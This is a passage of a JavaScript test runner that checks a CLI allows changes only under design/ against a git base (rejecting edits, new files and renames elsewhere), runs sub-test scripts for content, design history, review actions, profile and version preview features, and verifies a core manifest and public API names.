  // --base against a real git history: only design/** may have changed
  const dir = checkout();
  try {
    git(dir, "init", "-q"); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "base");
    write(dir, "design/theme.css", ".card { border-radius: 4px; }\n");
    write(dir, "design/assets/mark.svg", '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 8"><path d="M0 0h8v8z"/></svg>');
    let r = CLI(dir, "--base", "HEAD");
    ok("--base HEAD with a design-only diff (incl. an untracked file): exit 0", r.status === 0, r.stderr);
    write(dir, "lib/perm.js", readFileSync(path.join(dir, "lib/perm.js"), "utf8") + "\n// let everyone in\n");
    r = CLI(dir, "--base", "HEAD", "--no-layers");
    ok("--base HEAD with a lib/ change: exit 1 + scope rule", r.status === 1 && /scope\/outside-design/.test(r.stderr) && /lib\/perm\.js/.test(r.stderr), r.stderr);
    git(dir, "checkout", "-q", "--", "lib/perm.js");
    write(dir, "docs-sneaky.md", "x");
    r = CLI(dir, "--base", "HEAD", "--no-layers");
    ok("--base HEAD with a new file outside design/: exit 1", r.status === 1 && /docs-sneaky\.md/.test(r.stderr), r.stderr);
    rmSync(path.join(dir, "docs-sneaky.md"));
    git(dir, "mv", "lib/perm.js", "lib/perm2.js");
    r = CLI(dir, "--base", "HEAD", "--no-layers");
    ok("--base HEAD with a renamed core file: exit 1 (both names seen)", r.status === 1 && /lib\/perm\.js/.test(r.stderr), r.stderr);
  } finally { rmSync(dir, { recursive: true, force: true }); }
}

// ── 6. content-store core (offline unit tests: request headers, 412/428/422, permission gating, dry-run-only, registration needs the human) ──
{
  const r = spawnSync(process.execPath, [path.join(ROOT, "scripts/test-content.mjs")], { encoding: "utf8" });
  ok("scripts/test-content.mjs passes (content core)", r.status === 0, r.stdout + r.stderr);
}

// ── 7b. design history read layer (D13, PR1): the three ctx.data functions, routes defined but not registered (offline; 3 modes) ──
{
  const r = spawnSync(process.execPath, [path.join(ROOT, "scripts/test-design-history.mjs")], { encoding: "utf8" });
  ok("scripts/test-design-history.mjs passes (design history read layer)", r.status === 0, r.stdout + r.stderr);
}

// ── 7c. design review actions (D14, PR2): openDesignReview / requestDesignRevert / cancelDesignRequest (offline; 3 modes) ──
{
  const r = spawnSync(process.execPath, [path.join(ROOT, "scripts/test-design-review.mjs")], { encoding: "utf8" });
  ok("scripts/test-design-review.mjs passes (design review actions)", r.status === 0, r.stdout + r.stderr);
}

// ── 7d. personal profile (D21): validation mirror, sealed API, controller with a mock API, nothing new for the design layer (offline; 2 modes) ──
{
  const r = spawnSync(process.execPath, [path.join(ROOT, "scripts/test-profile.mjs")], { encoding: "utf8" });
  ok("scripts/test-profile.mjs passes (personal profile)", r.status === 0, r.stdout + r.stderr);
}

// ── 7. version preview core + preview-mode read-only + the core banner (offline; runs itself as a normal page and as a preview host) ──
{
  const r = spawnSync(process.execPath, [path.join(ROOT, "scripts/test-preview.mjs")], { encoding: "utf8" });
  ok("scripts/test-preview.mjs passes (version preview, read-only preview mode, core banner)", r.status === 0, r.stdout + r.stderr);
  const man = JSON.parse(readFileSync(path.join(ROOT, "scripts/core.manifest.json"), "utf8"));
  const files = Object.keys(man.files || man);
  for (const f of ["core/version-preview.js", "lib/preview.js", "lib/versionpreview.js", "lib/fixed-text.js", "ui/preview-banner.js", "design-defaults/views/design-version-preview.js", "design-defaults/parts/version-preview-section.js"]) ok(`core manifest covers ${f}`, files.includes(f));
  ok("public-api lists the two approved version preview names", api["ctx.actions"].includes("requestVersionPreview") && api["ctx.data"].includes("getVersionPreview"));
}

console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
